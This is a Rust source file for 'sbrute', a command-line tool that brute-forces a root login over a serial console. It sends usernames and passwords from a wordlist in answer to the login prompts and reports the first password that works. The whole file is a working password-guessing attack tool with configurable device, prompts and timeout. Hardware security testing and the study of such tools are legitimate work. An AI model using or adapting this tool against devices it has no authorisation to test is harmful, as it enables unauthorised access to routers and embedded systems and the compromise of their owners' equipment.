use std::env; // Module for environment variables
use clap::{App, Arg}; // Clap crate for parsing command-line arguments
use std::io::{self, BufRead}; // Input/output module for reading input
use std::fs::File; // File module for file operations
use std::io::prelude::*; // Module for buffered I/O operations
use std::time::Duration; // Module for defining time durations
use serialport::SerialPortSettings; // Serialport crate for serial port operations

// Main function
fn main() -> io::Result<()> {
    // Define command-line arguments using clap
    let matches = App::new("sbrute")
        .version("v1.0")
        .author("github.com/MY7H404")
        .about("A Rust-based tool for serial brute force attacks")
        // Define command-line arguments with default values and help messages
        .arg(
            Arg::new("device")
                .short('d')
                .long("device")
                .takes_value(true)
                .default_value("/dev/ttyUSB0")
                .help("The serial device to connect to"),
        )
        .arg(
            Arg::new("baudrate")
                .short('b')
                .long("baudrate")
                .takes_value(true)
                .default_value("115200")
                .help("The baud rate to be used"),
        )
        .arg(
            Arg::new("username")
                .short('u')
                .long("username")
                .takes_value(true)
                .default_value("root")
                .help("The username to be used for brute forcing"),
        )
        .arg(
            Arg::new("passwordfile")
                .short('f')
                .long("passwordfile")
                .takes_value(true)
                .default_value("pass.txt")
                .help("The password file to be used"),
        )
        .arg(
            Arg::new("loginsuccessstring")
                .short('s')
                .long("loginsuccessstring")
                .takes_value(true)
                .default_value("root@localhost$")
                .help("String that defines a successful login"),
        )
        .arg(
            Arg::new("usernameprompt")
                .short('l')
                .long("usernameprompt")
                .takes_value(true)
                .default_value("Login:")
                .help("String that defines the username login prompt"),
        )
        .arg(
            Arg::new("passwordprompt")
                .short('p')
                .long("passwordprompt")
                .takes_value(true)
                .default_value("Password:")
                .help("String that defines the login password prompt"),
        )
        .arg(
            Arg::new("timeout")
                .short('t')
                .long("timeout")
                .takes_value(true)
                .default_value("1")
                .help("Timeout value for the serial connection"),
        )
        .arg(
            Arg::new("verbose")
                .short('v')
                .long("verbose")
                .takes_value(false)
                .help("Verbose reporting [default: OFF]"),
        )
        .arg(
            Arg::new("help")
                .short('h')
                .long("help")
                .help("Show this help message and exit"),
        )
        // Parse command-line arguments
        .get_matches();

    // Retrieve values of command-line arguments
    let device = matches.value_of("device").unwrap_or("/dev/ttyUSB0");
    let baudrate = matches.value_of("baudrate").unwrap_or("115200");
    let username = matches.value_of("username").unwrap_or("root");
    let passwordfile = matches.value_of("passwordfile").unwrap_or("pass.txt");
    let loginsuccessstring = matches.value_of("loginsuccessstring").unwrap_or("root@localhost$");
    let usernameprompt = matches.value_of("usernameprompt").unwrap_or("Login:");
    let passwordprompt = matches.value_of("passwordprompt").unwrap_or("Password:");
    let timeout = matches.value_of("timeout").unwrap_or("1");
    let verbose = matches.is_present("verbose");

    // Check if no command-line arguments were provided (excluding the program name)
    if env::args().len() <= 1 {
        // Display help message and exit
        println!("USAGE: sbrute [options]");
        println!("For help, use: sbrute -h");
        return Ok(());
    }

    // Define serial port settings
    let settings = SerialPortSettings {
        baud_rate: baudrate.parse().unwrap(),
        timeout: Duration::from_secs(timeout.parse().unwrap()),
        ..Default::default()
    };

    // Open serial port
    let mut ser = serialport::open_with_settings(device, &settings)?;

    // Open password file
    let file = File::open(passwordfile)?;
    let reader = io::BufReader::new(file);

    // Loop through each password in the file
    for line in reader.lines() {
        let password = line?.trim().to_string();
        // Read lines from serial port
        let mut ser_reader = io::BufReader::new(ser.try_clone()?);
        let mut ser_line = String::new();
        loop {
            ser_reader.read_line(&mut ser_line)?;
            if ser_line.trim() == loginsuccessstring {
                println!("*** Success: Username: {} // Password: {}\n", username, password);
                ser.write_all("exit\n".as_bytes())?; // Send exit command after success
                return Ok(());
            } else if ser_line.trim() == usernameprompt {
                let user_str = format!("{}\n", username); // Append newline to username
                ser.write_all(user_str.as_bytes())?; // Send username and press Enter
            } else if ser_line.trim() == passwordprompt {
                let pass_str = format!("{}\n", password); // Append newline to password
                ser.write_all(pass_str.as_bytes())?; // Send password and press Enter
                if verbose {
                    println!("Trying Username: {} and Password: {}", username, password);
                }
                break;
            }
            ser_line.clear();
        }
    }

    println!("Password brute force completed without success.");
    Ok(())
}
